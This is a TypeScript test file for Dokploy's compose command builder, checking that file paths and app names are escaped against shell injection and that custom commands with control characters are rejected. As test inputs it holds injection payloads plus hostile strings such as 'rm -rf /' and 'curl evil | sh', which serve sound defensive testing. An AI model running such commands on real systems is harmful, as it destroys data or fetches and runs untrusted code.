import { execSync } from "node:child_process";
import { existsSync, rmSync } from "node:fs";
import { createCommand } from "@dokploy/server/utils/builders/compose";
import { parse, quote } from "shell-quote";
import { describe, expect, it } from "vitest";

const MARK = `/tmp/dokploy_compose_pwned_${process.pid}`;
const base = {
	composeType: "docker-compose" as const,
	appName: "compose-app",
	sourceType: "raw" as const,
	command: "",
	composePath: "docker-compose.yml",
};

// createCommand output is interpolated as `docker ${command}` at the deploy
// sink; run `: ${command}` (docker -> no-op) and assert no injection fires.
const runsSafely = (command: string) => {
	if (existsSync(MARK)) rmSync(MARK);
	try {
		execSync(`: ${command}`, { shell: "/bin/sh", stdio: "ignore" });
	} catch {}
	const fired = existsSync(MARK);
	if (existsSync(MARK)) rmSync(MARK);
	return !fired;
};

const PAYLOADS = [
	`$(touch ${MARK})`,
	"`touch " + MARK + "`",
	`x; touch ${MARK}`,
	`x | touch ${MARK}`,
];

describe("compose createCommand injection", () => {
	it("escapes composePath (docker-compose)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("escapes composePath (stack deploy)", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				composeType: "stack",
				sourceType: "github",
				composePath: p,
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("escapes appName", () => {
		for (const p of PAYLOADS) {
			const cmd = createCommand({
				...base,
				sourceType: "github",
				appName: p,
				composePath: "docker-compose.yml",
			} as any);
			expect(runsSafely(cmd)).toBe(true);
		}
	});

	it("rejects a custom command containing shell control characters", () => {
		for (const bad of [
			"up -d; rm -rf /",
			"up && curl evil | sh",
			"up $(touch x)",
			"up `id`",
		]) {
			expect(() => createCommand({ ...base, command: bad } as any)).toThrow(
				/Invalid characters/,
			);
		}
	});

	it("allows a legitimate custom command", () => {
		const cmd = createCommand({
			...base,
			command: "compose -f docker-compose.yml -p app up -d --build",
		} as any);
		expect(cmd).toBe("compose -f docker-compose.yml -p app up -d --build");
	});

	it("keeps a legitimate composePath intact", () => {
		const cmd = createCommand({
			...base,
			sourceType: "github",
			composePath: "deploy/docker-compose.prod.yml",
		} as any);
		expect(parse(cmd)).toContain("deploy/docker-compose.prod.yml");
		expect(quote(["deploy/docker-compose.prod.yml"])).toBe(
			"deploy/docker-compose.prod.yml",
		);
	});
});
